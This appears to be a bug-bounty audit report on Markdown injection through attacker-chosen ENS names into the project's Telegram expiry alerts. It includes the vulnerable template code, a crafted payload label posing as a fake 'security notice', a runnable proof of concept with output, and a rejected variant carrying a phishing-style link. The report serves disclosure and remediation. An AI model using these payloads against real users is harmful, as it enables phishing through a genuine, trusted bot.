# 89255 w a insight attacker controlled ens name injected into telegram expiry notifications without escaping

**Submitted on Aug 18th 2026 at 09:08:29 UTC by @shadowHunter for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89255
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
    * HTML injection without JavaScript
    * Replacing existing text with arbitrary text
    * Arbitrary file uploads, etc.

## Description

## Summary

The Telegram notification templates build message text with plain JavaScript template literals and hand the result to the Telegram Bot API with `parse_mode: 'Markdown'`. The ENS name is interpolated directly into that string with no escaping of Markdown metacharacters, and there is no escaping or normalising helper anywhere in the delivery layer.

Because ENS registration commits to a *labelhash* rather than to a validated string, an attacker can register a name whose label contains Markdown metacharacters. The indexer stores and returns that label verbatim, and the worker accepts it into a `v.string()` field with no charset restriction.

The attacker then transfers the crafted name to a chosen victim. Recipient selection for expiry alerts matches the on-chain owner against the user table, so no acceptance, approval, or interaction by the victim is required. On the next alert cycle, the victim receives a genuine, correctly-signed ENS notification from the project's verified bot containing attacker-authored bold text of the attacker's choosing.

## Root cause and data flow

```
attacker registers a label containing Markdown metacharacters
        │   (registration commits to keccak256(label); no charset validation on-chain)
        ▼
indexer reconstructs and stores  name = label + ".eth"   verbatim
        │   (no ENSIP-15 normalisation; only NUL, '.', '[' and ']' are rejected — see §8.2)
        ▼
worker fetches expiring names        name: v.string()      §3.3
        ▼
buildExpiryEvents passes it through unchanged              §3.4
        ▼
collectRecipientsForEvent maps on-chain owner -> victim    §3.5
        ▼
telegramTemplates['name-expiry'] interpolates it, unescaped §3.1
        ▼
Telegram Bot API renders it with parse_mode: 'Markdown'
        ▼
victim sees attacker-authored bold text inside a genuine ENS alert
```

The root cause is a single missing step: output encoding at the boundary between application data and a formatting language.

## 3. Affected code

### 3.1 The injection sink

`workers/api-worker/src/services/delivery/templates/telegram.ts`, the `'name-expiry'` template:

```ts
'name-expiry': (payload) => {
  const daysLeft = Math.ceil(
    (payload.expiryDate - Date.now()) / (1000 * 60 * 60 * 24),
  )

  const ownerText = payload.isOwner
    ? `Your domain \`${payload.name}\` will expire in *${daysLeft} days*.\n\nDon't forget to renew your domain!`
    : `The domain \`${payload.name}\` you're watching will expire in *${daysLeft} days*.`

  return {
    text: `⚠️ *Domain Expiration Alert*\n\n${ownerText}`,
    parseMode: 'Markdown',
    buttons: [
      [
        {
          text: '🔄 Renew Now',
          url: `https://app.ens.domains/${payload.name}`,
        },
      ],
    ],
  }
},
```

`payload.name` is interpolated into a string that is then parsed as Markdown by the recipient's client. It is also interpolated, un-encoded, into the inline button's URL path.

The `'name-transferred'` template in the same file uses the identical pattern with `payload.name`, `payload.to` and `payload.txHash`. It was not exercised by the PoC but is affected by the same defect.

### 3.2 No escaping exists anywhere in the delivery layer

A recursive, case-insensitive search for `normali[sz]|ensip|escape|sanitiz` across `workers/api-worker/src/services/delivery/` and `workers/api-worker/src/queues/` returns **zero matches**. There is no escaping helper to have been forgotten at this call site — the concept is absent from the subsystem.

### 3.3 The name enters the worker with no charset restriction

`workers/api-worker/src/services/expiry-discovery/indexer.ts` validates the indexer response with:

```ts
const indexerResponseSchema = v.object({
  domains: v.array(
    v.object({
      name: v.string(),
      expiryDate: v.number(),
      owner: v.nullable(v.object({ id: v.nullable(v.string()) })),
    }),
  ),
})
```

`v.string()` imposes no length, charset, or pattern constraint.

### 3.4 The name is passed through unchanged

`workers/api-worker/src/services/expiry-discovery/index.ts`:

```ts
function buildExpiryEvents(
  stage: ExpiryStageConfig,
  domains: { name: string; expiryDate: number; owner?: string }[],
): ExpiryEvent[] {
  return domains.map((domain) => ({
    type: 'name_expiring',
    name: domain.name,
    expiryDate: domain.expiryDate,
    stage: stage.id,
    owner: domain.owner,
    includeFavorites: stage.includeFavorites,
  }))
}
```

### 3.5 The attacker chooses the victim

`workers/api-worker/src/queues/event-ingestion.ts` — `collectRecipientsForEvent` matches the event's on-chain `owner` against the user table's wallet address to determine who receives the alert. Transferring a name to an address is unilateral: the recipient neither approves nor acknowledges it. The attacker therefore selects the victim directly, and the victim takes no action at any point before delivery.

## Steps to reproduce

{% stepper %}
{% step %}

## The attacker registers an ENS name whose label carries the payload

Registration commits to `keccak256(label)`, so the label is not validated against any character set on-chain. The label used in the PoC:

```
vitalik`*SECURITY-NOTICE-Auto-renewal-payment-FAILED-restore-access-now*`x
```

Two backticks and two asterisks, no brackets and no dots. The resulting full name is that label plus `.eth`.
{% endstep %}

{% step %}

## The attacker sets the name's expiry into the alert window

Any name approaching expiry is picked up by the scheduled discovery job; the attacker can simply register with a short duration, or wait.
{% endstep %}

{% step %}

## The attacker transfers the name to the victim's address

This is unilateral — the victim is not asked and is not notified by the protocol. From this point the victim is the on-chain owner and the attacker has no further involvement.
{% endstep %}

{% step %}

## The scheduled job runs

It queries the indexer for expiring names, receives the crafted name verbatim, and enqueues an expiry event whose `owner` is the victim's address.
{% endstep %}

{% step %}

## The recipient resolver maps the event to the victim

`collectRecipientsForEvent` matches `event.owner` against the user table and selects the victim's verified Telegram channel.
{% endstep %}

{% step %}

## The template composes the message

The name is interpolated unescaped, producing:

```
⚠️ *Domain Expiration Alert*

Your domain `vitalik`*SECURITY-NOTICE-Auto-renewal-payment-FAILED-restore-access-now*`x.eth` will expire in *7 days*.

Don't forget to renew your domain!
```

{% endstep %}

{% step %}

## Telegram parses it and delivers

The backticks close and reopen the code span; the enclosed asterisks are read as bold. The victim receives a genuine message from the project's verified bot in which the line "**SECURITY-NOTICE-Auto-renewal-payment-FAILED-restore-access-now**" appears in bold, alongside the intact "⚠️ **Domain Expiration Alert**" header and "**7 days**" urgency text.
{% endstep %}
{% endstepper %}

## Impact

An attacker can place arbitrary formatted text of their choosing inside a genuine notification from the project's verified Telegram bot, addressed to a victim of their choosing, with no action by that victim.

The trust properties that make this material:

* The message genuinely originates from the project's bot. Sender verification does not help the victim.
* The legitimate formatting survives intact, so the message does not look corrupted or suspicious.
* The injected text sits in the same visual register as the app's own security-relevant wording.
* The victim performed no action and has no reason to associate the message with an attacker.

A variant with unbalanced entities causes the Telegram API to reject the whole message, silently suppressing a genuine expiry warning for that name. That is a lesser but real availability consequence on a security-relevant notification.

## Recommendation

Escape Markdown metacharacters before interpolation, or switch the delivery to plain text.

## Proof of Concept

### Prerequisites

* Node.js v22 (tested on v22.21.1). No install step, no network access.
* A checkout of the audited revision. Node's native TypeScript type-stripping loads the template directly because `telegram.ts` imports its only dependency with `import type`, leaving it with zero runtime dependencies.

### Placement and setup

Create a working directory containing the two files in §10.4 and §10.5. In `poc-v2.ts`, replace the two `<REPO>` placeholders with the path to your checkout of the audited revision, then run:

```bash
node poc-v2.ts
```

### `tg-markdown.ts` — local approximation of Telegram's legacy Markdown parser

````ts
/**
 * A deliberately small model of Telegram's legacy `Markdown` parse mode.
 *
 * Supported: *bold*, _italic_, `code`, ```pre```, [text](url).
 * Entities must be balanced; an unterminated entity throws, which mirrors the
 * Bot API rejecting the whole message with HTTP 400.
 *
 * This is NOT Telegram's implementation. It is sufficient to demonstrate that
 * attacker-supplied metacharacters are interpreted as formatting rather than
 * shown literally, which is the property under test.
 */

export type TgEntity = {
  type: 'bold' | 'italic' | 'code' | 'pre' | 'text_link'
  text: string
  url?: string
}

export type TgParseResult = {
  /** The message text as the victim's client renders it (markers removed). */
  plainText: string
  entities: TgEntity[]
}

export class TgParseError extends Error {
  constructor(message: string) {
    super(message)
    this.name = 'TgParseError'
  }
}

const BACKSLASH = String.fromCharCode(92)
const MARKDOWN_CHARS = new Set(['*', '_', '`', '[', ']', '(', ')', BACKSLASH])

const DELIMS: Array<{ marker: string; type: TgEntity['type'] }> = [
  { marker: '```', type: 'pre' },
  { marker: '`', type: 'code' },
  { marker: '*', type: 'bold' },
  { marker: '_', type: 'italic' },
]

export function parseTelegramLegacyMarkdown(input: string): TgParseResult {
  const entities: TgEntity[] = []
  let plain = ''
  let i = 0

  while (i < input.length) {
    const ch = input[i]

    if (ch === BACKSLASH && i + 1 < input.length && MARKDOWN_CHARS.has(input[i + 1])) {
      plain += input[i + 1]
      i += 2
      continue
    }

    if (ch === '[') {
      const close = input.indexOf(']', i + 1)
      if (close === -1) throw new TgParseError("can't find end of text_link entity")
      if (input[close + 1] !== '(') throw new TgParseError('malformed text_link entity')
      const urlEnd = input.indexOf(')', close + 2)
      if (urlEnd === -1) throw new TgParseError("can't find end of text_link url")
      const label = input.slice(i + 1, close)
      const url = input.slice(close + 2, urlEnd)
      entities.push({ type: 'text_link', text: label, url })
      plain += label
      i = urlEnd + 1
      continue
    }

    const delim = DELIMS.find((d) => input.startsWith(d.marker, i))
    if (delim) {
      const end = input.indexOf(delim.marker, i + delim.marker.length)
      if (end === -1) {
        throw new TgParseError(
          `can't find end of ${delim.type} entity at byte offset ${i}`,
        )
      }
      const text = input.slice(i + delim.marker.length, end)
      entities.push({ type: delim.type, text })
      plain += text
      i = end + delim.marker.length
      continue
    }

    plain += ch
    i += 1
  }

  return { plainText: plain, entities }
}

export function renderAnnotated(res: TgParseResult): string {
  const lines = [res.plainText, '', 'entities:']
  for (const e of res.entities) {
    lines.push(`  ${e.type}: ${JSON.stringify(e.text)}${e.url ? ` -> ${e.url}` : ''}`)
  }
  return lines.join('\n')
}
````

### `poc-v2.ts`

```ts
/**
 * poc-v2.ts — Telegram Markdown injection via an attacker-chosen ENS label.
 *
 * The payload is constrained to characters that survive the ENS indexer's label
 * validation, which rejects NUL, '.', '[' and ']'. An earlier revision used a
 * Markdown link "[text](url)" and therefore could never have reached this code
 * path; it is retained below only to demonstrate that.
 *
 * The template under test is loaded from the audited source file itself; the
 * repo is only ever read, never modified. No network access: rendering uses a
 * local approximation of Telegram's legacy Markdown parser.
 *
 * Replace <REPO> with the path to your checkout of the audited revision.
 */
import { createHash } from 'node:crypto'
import { readFileSync } from 'node:fs'
import { telegramTemplates } from 'file:///<REPO>/workers/api-worker/src/services/delivery/templates/telegram.ts'
import { parseTelegramLegacyMarkdown } from './tg-markdown.ts'

const SRC = '<REPO>/workers/api-worker/src/services/delivery/templates/telegram.ts'
const sha = createHash('sha256').update(readFileSync(SRC)).digest('hex')

// Clock pinned so the rendered "days" figure is deterministic across runs.
const NOW = 1_700_000_000_000
Date.now = () => NOW
const EXPIRY = NOW + 7 * 24 * 60 * 60 * 1000

// Indexer label validation, transcribed from the ENS subgraph's checkValidLabel:
// it rejects NUL (0), '.' (46), '[' (91) and ']' (93). Nothing else.
const INDEXER_REJECT = [0, 46, 91, 93]
function labelSurvivesIndexer(label: string) {
  for (let i = 0; i < label.length; i++) {
    const code = label.charCodeAt(i)
    if (INDEXER_REJECT.includes(code)) {
      return { ok: false, char: label[i], code }
    }
  }
  return { ok: true, char: '', code: -1 }
}

const BENIGN_LABEL = 'vitalik'
// Viable payload: backticks and asterisks only. No brackets, no dots.
const ATTACK_LABEL =
  'vitalik`*SECURITY-NOTICE-Auto-renewal-payment-FAILED-restore-access-now*`x'
// Earlier revision's payload, retained to show why it is not viable.
const REV1_LABEL =
  'vitalik`*SECURITY-NOTICE*[Restore-your-name](https://ens-renewal.example/x)`eth'

const hr = (t: string) =>
  console.log(`\n${'='.repeat(74)}\n${t}\n${'='.repeat(74)}`)

console.log("Template under test : telegramTemplates['name-expiry']")
console.log('sha256(source)      :', sha)

hr('STEP 1 — indexer label validation (NUL, ".", "[", "]" are rejected)')
const cases: Array<[string, string]> = [
  ['benign', BENIGN_LABEL],
  ['payload (rev2)', ATTACK_LABEL],
  ['payload (rev1)', REV1_LABEL],
]
for (const [name, label] of cases) {
  const v = labelSurvivesIndexer(label)
  console.log(
    `${name.padEnd(15)} ${v.ok ? 'SURVIVES' : `REJECTED (${JSON.stringify(v.char)} = charCode ${v.code})`}`,
  )
}

hr('STEP 2 — message built by the real template')
const render = (label: string) =>
  telegramTemplates['name-expiry']({
    name: `${label}.eth`,
    expiryDate: EXPIRY,
    isOwner: true,
    owner: `0x${'11'.repeat(20)}`,
  } as never)

const benign = render(BENIGN_LABEL)
const attack = render(ATTACK_LABEL)
console.log('--- benign ---')
console.log(benign.text)
console.log('\n--- with payload ---')
console.log(attack.text)
console.log('\nparseMode:', attack.parseMode)

hr('STEP 3 — how Telegram parses each (entity map)')
for (const [label, msg] of [
  ['BENIGN', benign],
  ['PAYLOAD', attack],
] as const) {
  try {
    const parsed = parseTelegramLegacyMarkdown(msg.text)
    console.log(`\n${label}: parse status = ACCEPTED (deliverable)`)
    console.log(`  entities (${parsed.entities.length}):`)
    parsed.entities.forEach((e, i) =>
      console.log(
        `    [${i}] ${String(e.type).padEnd(10)} ${JSON.stringify(e.text)}`,
      ),
    )
    console.log('  victim sees:', JSON.stringify(parsed.plainText))
  } catch (e) {
    console.log(`\n${label}: parse status = REJECTED (Telegram returns HTTP 400)`)
    console.log('  error:', (e as Error).message)
  }
}

hr('STEP 4 — the injected entities')
const p = parseTelegramLegacyMarkdown(attack.text)
const b = parseTelegramLegacyMarkdown(benign.text)
console.log(`entity count: benign ${b.entities.length} -> payload ${p.entities.length}`)
console.log('\nattacker-authored:')
for (const e of p.entities) {
  if (String(e.text).includes('SECURITY-NOTICE')) {
    console.log(`  type=${e.type}  text=${JSON.stringify(e.text)}   <-- INJECTED`)
  }
}
console.log('\nlegitimate entities still intact (message still looks authentic):')
for (const e of p.entities) {
  if (/Domain Expiration Alert|days/.test(String(e.text))) {
    console.log(`  type=${e.type}  text=${JSON.stringify(e.text)}`)
  }
}

hr('STEP 5 — button URL (second-order)')
console.log('button label:', JSON.stringify(attack.buttons?.[0]?.[0]?.text))
console.log('button url  :', attack.buttons?.[0]?.[0]?.url)
console.log(
  '(host is fixed at app.ens.domains; only the path carries attacker text, un-encoded)',
)

hr('DONE')
```

### Actual output

```
Template under test : telegramTemplates['name-expiry']
sha256(source)      : 28269e33d4000accec15cad98d5e4847bcd8339ce7ed30ecb4f787515ececaf2

==========================================================================
STEP 1 — indexer label validation (NUL, ".", "[", "]" are rejected)
==========================================================================
benign          SURVIVES
payload (rev2)  SURVIVES
payload (rev1)  REJECTED ("[" = charCode 91)

==========================================================================
STEP 2 — message built by the real template
==========================================================================
--- benign ---
⚠️ *Domain Expiration Alert*

Your domain `vitalik.eth` will expire in *7 days*.

Don't forget to renew your domain!

--- with payload ---
⚠️ *Domain Expiration Alert*

Your domain `vitalik`*SECURITY-NOTICE-Auto-renewal-payment-FAILED-restore-access-now*`x.eth` will expire in *7 days*.

Don't forget to renew your domain!

parseMode: Markdown

==========================================================================
STEP 3 — how Telegram parses each (entity map)
==========================================================================

BENIGN: parse status = ACCEPTED (deliverable)
  entities (3):
    [0] bold       "Domain Expiration Alert"
    [1] code       "vitalik.eth"
    [2] bold       "7 days"
  victim sees: "⚠️ Domain Expiration Alert\n\nYour domain vitalik.eth will expire in 7 days.\n\nDon't forget to renew your domain!"

PAYLOAD: parse status = ACCEPTED (deliverable)
  entities (5):
    [0] bold       "Domain Expiration Alert"
    [1] code       "vitalik"
    [2] bold       "SECURITY-NOTICE-Auto-renewal-payment-FAILED-restore-access-now"
    [3] code       "x.eth"
    [4] bold       "7 days"
  victim sees: "⚠️ Domain Expiration Alert\n\nYour domain vitalikSECURITY-NOTICE-Auto-renewal-payment-FAILED-restore-access-nowx.eth will expire in 7 days.\n\nDon't forget to renew your domain!"

==========================================================================
STEP 4 — the injected entities
==========================================================================
entity count: benign 3 -> payload 5

attacker-authored:
  type=bold  text="SECURITY-NOTICE-Auto-renewal-payment-FAILED-restore-access-now"   <-- INJECTED

legitimate entities still intact (message still looks authentic):
  type=bold  text="Domain Expiration Alert"
  type=bold  text="7 days"

==========================================================================
STEP 5 — button URL (second-order)
==========================================================================
button label: "🔄 Renew Now"
button url  : https://app.ens.domains/vitalik`*SECURITY-NOTICE-Auto-renewal-payment-FAILED-restore-access-now*`x.eth
(host is fixed at app.ens.domains; only the path carries attacker text, un-encoded)

==========================================================================
DONE
```

### What the output shows

* **`sha256` line** — the template was loaded from the audited source file, not reimplemented. The hash can be checked against the repository.
* **Step 1** — the viable payload passes the indexer's label gate, and the earlier revision's link payload is rejected on `[` (charCode 91). This is the evidence behind §8.2.
* **Step 2** — the message the real template produces. The benign name yields one code span; the payload closes it, opens a bold run, and reopens a code span for the trailing `.eth`.
* **Step 3** — both messages parse successfully, so the payload is **deliverable**, not an API rejection. Entity count rises from 3 to 5. The "victim sees" line shows the metacharacters consumed as formatting, not displayed — the victim never sees the backticks or asterisks.
* **Step 4** — entity `[2]` is a **bold** run whose entire text is attacker-authored, while entities `[0]` and `[4]` — the "⚠️ **Domain Expiration Alert**" header and "**7 days**" urgency text — remain intact. The message retains its authentic appearance while carrying the attacker's content.
* **Step 5** — the button's visible label is unchanged, but its URL path carries the raw payload with no `encodeURIComponent`. The host is fixed, so this cannot redirect off-domain; it is recorded as a second, separate encoding defect at the same call site.
